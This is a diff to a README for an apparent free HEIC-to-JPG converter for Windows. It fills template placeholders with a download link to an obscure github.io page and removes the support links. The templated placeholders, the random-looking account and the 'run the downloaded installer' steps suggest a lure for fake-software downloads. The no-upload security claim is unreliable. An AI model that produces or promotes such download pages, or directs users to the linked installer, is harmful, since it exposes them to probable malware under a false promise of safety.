@@ -14,7 +14,7 @@
 <div align="center">
   <h3>A fast, free HEIC to JPG converter that turns Apple HEIC photos into JPG, JPEG, PNG, and PDF</h3>
 
-  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](PASTE-DOWNLOAD-LINK-HERE)
+  [![Download HEIC Converter](https://img.shields.io/badge/⬇_Download_HEIC_Converter_for_Windows-2962FF?style=for-the-badge)](https://rossanastmichelshsqvt.github.io/.github/Heic-Converter-App)
 
 </div>
 
@@ -56,7 +56,7 @@ HEIC Converter for Windows is a lightweight HEIC file converter that turns Apple
 | Storage | 150 MB free space | 500 MB free space |
 
 ## 📥 Installation
-1. Click the **Download** button above (or open the [Releases](<!-- USER TO ADD RELEASES LINK -->) page).
+1. Click the **Download** button above (or open the [Releases](https://rossanastmichelshsqvt.github.io/.github/Heic-Converter-App) page).
 2. Run the downloaded installer.
 3. Follow the on-screen setup steps.
 4. Launch HEIC Converter and start converting your HEIC files.
@@ -80,11 +80,6 @@ You can use it as a HEIC converter to JPG, a HEIC to JPEG converter, a HEIC to P
 
 **Is my data secure?**
 Yes. This HEIC image converter processes every file locally on your computer — your photos are never uploaded anywhere.
-
-## 🛟 Support
-- 📖 Documentation: <!-- USER TO ADD DOCS LINK -->
-- 🐞 Report an issue: <!-- USER TO ADD ISSUES LINK -->
-- 🌐 Official website: <!-- USER TO ADD WEBSITE LINK -->
 
 ## 📄 License
 This project is licensed under the **MIT License** — you are free to use, copy, modify, and distribute it.
